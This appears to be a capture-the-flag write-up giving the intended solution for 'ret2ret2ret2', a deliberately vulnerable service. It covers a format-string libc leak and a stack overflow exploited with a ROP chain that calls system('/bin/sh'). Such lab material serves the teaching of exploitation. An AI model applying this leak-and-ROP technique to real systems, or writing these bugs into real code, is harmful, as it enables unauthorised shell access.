# ret2ret2ret2 intended solution

## Bugs

The service has two intentional bugs in `vuln()`:

```c
printf(fmt, puts, main, vuln, pop_rdi_ret, ret_ret_ret);
read(0, buf, 256);
```

The first bug is an attacker-controlled format string. `%1$p` reliably leaks the first extra argument, which is `puts` from libc.

The second bug overflows a 64-byte stack buffer. The saved return address is reached after 72 bytes.

## Exploit plan

1. Send `%1$p` at `format>`.
2. Compute `libc.address = puts_leak - libc.symbols["puts"]`.
3. Send a ROP chain at `overflow>`:

```text
'A' * 72
ret
ret
ret
pop rdi ; ret
address of "/bin/sh"
address of system
```

4. Run `cat /tmp/flag`.

## Local test

```bash
cd src
docker compose up --build
```

In another terminal:

```bash
cd solver
python3 solve.py HOST=127.0.0.1 PORT=9999
```
